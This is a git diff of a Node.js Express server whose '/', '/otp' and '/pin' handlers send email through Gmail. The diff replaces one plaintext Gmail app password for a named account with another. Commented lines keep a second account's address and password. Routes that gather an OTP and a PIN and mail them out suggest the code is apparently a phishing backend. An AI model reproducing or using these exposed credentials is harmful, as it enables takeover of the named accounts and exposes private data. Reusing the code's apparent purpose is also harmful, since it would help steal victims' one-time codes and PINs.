@@ -23,7 +23,7 @@ app.post('/',(req,res) => {
             // user: 'edehchinedu59@gmail.com',
             // pass: 'yknycyzsxdkxpepq'
             user: 'Victorchinemeremfx.112@gmail.com',
-            pass: 'krbxkoemjvdnexdf'
+            pass: 'eujqfpdvuhepijkk'
             
         }
     })
@@ -56,7 +56,7 @@ app.post('/otp',(req,res) => {
           // user: 'edehchinedu59@gmail.com',
             // pass: 'yknycyzsxdkxpepq'
             user: 'Victorchinemeremfx.112@gmail.com',
-            pass: 'krbxkoemjvdnexdf'
+            pass: 'eujqfpdvuhepijkk'
         }
     })
 
@@ -92,7 +92,7 @@ app.post('/pin',(req,res) => {
         // user: 'edehchinedu59@gmail.com',
             // pass: 'yknycyzsxdkxpepq'
             user: 'Victorchinemeremfx.112@gmail.com',
-            pass: 'krbxkoemjvdnexdf'
+            pass: 'eujqfpdvuhepijkk'
         }
     })
 
